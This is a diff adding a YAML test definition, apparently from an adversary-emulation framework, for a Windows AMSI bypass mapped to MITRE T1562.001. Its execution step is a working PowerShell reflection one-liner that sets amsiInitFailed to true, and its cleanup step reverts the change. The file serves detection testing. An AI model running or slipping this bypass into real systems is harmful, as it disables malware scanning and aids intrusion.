@@ -1,0 +1,27 @@
+api_version: "2.0"
+name: AMSI Bypass - AMSI InitFailed
+description: |
+    Any easy way to bypass AMSI inspection is it patch the dll in memory setting the "amsiInitFailed" function to true.
+    Upon execution, no output is displayed.
+
+    https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/
+uuid: 695eed40-e949-40e5-b306-b4031e4154bd
+mitre:
+    tactics:
+        - 'TA0005: Defense Evasion'
+    techniques:
+        - 'T1562: Impair Defenses'
+    subtechniques:
+        - 'T1562.001: Disable or Modify Tools'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: amsi-bypass---amsi-initfailed
+      inline: |
+        [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+      executor: powershell
+      cleanup:
+        inline: |
+            [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$false)
+        executor: powershell
